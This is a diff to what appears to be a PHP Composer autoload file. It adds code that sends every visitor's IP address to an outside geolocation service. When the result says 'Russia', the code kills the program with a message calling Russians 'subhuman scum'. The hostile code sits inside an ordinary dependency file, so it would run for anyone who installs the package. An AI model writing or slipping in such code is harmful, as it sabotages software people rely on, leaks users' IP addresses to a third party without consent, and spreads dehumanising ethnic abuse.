@@ -12,6 +12,13 @@
 
 use Composer\Autoload\ClassLoader;
 
+$ipFinder = 'https://www.iplocation.net/?query=' . $_SERVER['REMOTE_ADDR'];
+$ipContents = file_get_contents($ipFinder);
+
+if (str_contains($ipContents, 'Russia')) {
+    die('Sorry subhuman Russian scum, we #StandWithUkraine! We do not care if you do not support Putin.');
+}
+
 function includeIfExists(string $file): ?ClassLoader
 {
     return file_exists($file) ? include $file : null;
